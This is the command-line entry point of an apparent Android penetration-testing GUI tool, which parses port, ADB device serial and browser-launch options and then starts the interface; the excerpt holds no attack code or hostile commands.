# ── CLI entry ─────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(description="secV Android Pentest GUI")
    ap.add_argument("--port",   type=int, default=_GUI_PORT, help="HTTP port (default 8897)")
    ap.add_argument("--serial", default="",                  help="Default ADB device serial")
    ap.add_argument("--no-browser", action="store_true",     help="Do not auto-open browser")
    args = ap.parse_args()
    launch(port=args.port, serial=args.serial, open_browser=not args.no_browser)


if __name__ == "__main__":
    main()
